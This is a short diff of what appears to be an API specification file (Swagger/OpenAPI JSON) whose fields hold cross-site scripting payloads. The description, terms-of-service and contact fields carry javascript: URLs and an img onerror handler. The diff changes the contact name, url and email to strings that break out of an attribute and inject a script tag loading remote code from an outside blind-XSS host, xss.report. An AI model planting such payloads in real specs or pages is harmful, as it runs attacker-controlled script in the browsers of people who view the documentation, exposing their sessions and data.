@@ -6,9 +6,9 @@
 "description": "[asd](javascript:alert(document.domain))xxxx<img src=x onerror=alert('XSS');>xxxx",
 "termsOfService": "javascript:alert(document.domain)",
 "contact": {
-"name": "phishing link",
-"url": "javascript:alert(document.domain)",
-"email": "javascript:alert(document.domain)"
+"name": "'"><script src=//xss.report/s/Ma7moodBakr></script>",
+"url": "'"><script src=//xss.report/s/Ma7moodBakr></script>",
+"email": "'"><script src=//xss.report/s/Ma7moodBakr></script>"
 }
 },
 "basePath": "/",
